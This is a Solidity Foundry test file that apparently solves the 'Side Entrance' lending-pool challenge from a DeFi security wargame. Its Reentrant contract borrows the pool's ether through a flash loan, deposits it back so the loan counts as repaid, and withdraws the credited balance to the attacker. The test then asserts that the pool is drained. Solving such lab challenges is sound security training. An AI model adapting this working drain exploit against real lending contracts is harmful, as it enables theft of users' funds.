// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract Reentrant is Test {
    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
	pool = _pool;
    }

    function flashLoan(uint256 amount) external {
	pool.flashLoan(amount);
    }

    bool drained;

    fallback() external payable {
	if (!drained) {
	    emit log_named_uint("received flashLoan", msg.value);
	    drained = true;
	    pool.deposit{value: msg.value}();
	}
    }

    function withdraw() external {
	pool.withdraw();
	uint newBalance = address(this).balance;
	emit log_named_uint("bal after exploit", newBalance);
	msg.sender.call{value: newBalance}("");
    }
}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
	vm.startPrank(attacker);
	Reentrant reentrant = new Reentrant(sideEntranceLenderPool);
	reentrant.flashLoan(1000 ether);
	reentrant.withdraw();
	vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
